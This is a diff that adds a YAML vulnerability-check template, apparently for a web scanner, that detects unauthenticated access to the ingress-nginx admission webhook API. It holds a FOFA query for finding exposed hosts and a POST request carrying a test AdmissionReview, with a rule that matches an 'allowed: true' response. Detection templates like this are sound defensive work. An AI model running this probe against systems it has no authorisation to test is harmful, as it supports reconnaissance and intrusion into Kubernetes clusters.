@@ -1,0 +1,35 @@
+id: poc-yaml-ingress-nginx-controller-admission-api-unauthorized-access
+info:
+  name: ingress-nginx-controller-admission 准入服务API未授权访问
+  severity: high
+  tags:
+  - 未授权访问
+  finger: ingress-nginx
+  fofa: cert="nil1" && cert="nil2" && cert="nginx"
+requests:
+- method: POST
+  path: /
+  expression: status_code == 400
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/json
+  data: "{\n  \"apiVersion\": \"admission.k8s.io/v1\",\n  \"kind\": \"AdmissionReview\"\
+    ,\n  \"request\": {\n    \"uid\": \"test-uid\",\n    \"kind\": {\"group\":\"networking.k8s.io\"\
+    ,\"version\":\"v1\",\"kind\":\"Ingress\"},\n    \"resource\": {\"group\":\"networking.k8s.io\"\
+    ,\"version\":\"v1\",\"resource\":\"ingresses\"},\n    \"name\": \"test-ingress\"\
+    ,\n    \"namespace\": \"default\",\n    \"operation\": \"CREATE\",\n    \"object\"\
+    : {\n      \"apiVersion\": \"networking.k8s.io/v1\",\n      \"kind\": \"Ingress\"\
+    ,\n      \"metadata\": {\n        \"name\": \"test-ingress\",\n        \"namespace\"\
+    : \"default\"\n      },\n      \"spec\": {\n        \"rules\": [\n          {\n\
+    \            \"host\": \"example.com\",\n            \"http\": {\n           \
+    \   \"paths\": [\n                {\n                  \"path\": \"/\",\n    \
+    \              \"pathType\": \"Prefix\",\n                  \"backend\": {\n \
+    \                   \"service\": {\n                      \"name\": \"test-service\"\
+    ,\n                      \"port\": {\"number\": 80}\n                    }\n \
+    \                 }\n                }\n              ]\n            }\n     \
+    \     }\n        ]\n      }\n    }\n  }\n}"
+  expression: status_code == 200 && contains(body,"\"response\":") && contains(body,"\"uid\"\x3a
+    \"test-uid\"") && contains(body,"\"allowed\"\x3a true") && !contains(body,"<")
+variables: {}
+transport: http
